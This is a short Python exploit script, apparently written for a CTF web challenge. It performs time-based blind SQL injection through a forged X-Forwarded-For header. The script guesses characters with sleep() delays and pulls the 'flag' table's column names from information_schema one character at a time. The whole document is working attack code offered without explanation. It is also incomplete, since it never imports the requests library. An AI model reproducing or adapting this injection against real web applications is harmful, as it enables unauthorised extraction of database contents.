url = 'http://ctf5.shiyanbar.com/web/wonderkun/index.php'
columns = ''
for i in range(1,5):
    for each in range(30,127):
        header={
                "X-Forwarded-For":"1' and case when(ascii(substring((select group_concat(column_name separator ';') from information_schema.columns where table_name='flag') from %s for 1))=%s) then sleep(6) else 0 end and 'a'='a" % (i,each)
                }
        try:
            r = requests.get(url, headers=header, timeout=6)
            print(" "+r.text)
        except:
            columns += chr(each)
            print("")
            print(chr(each))
            print("")
            break

print("column: %s" % columns)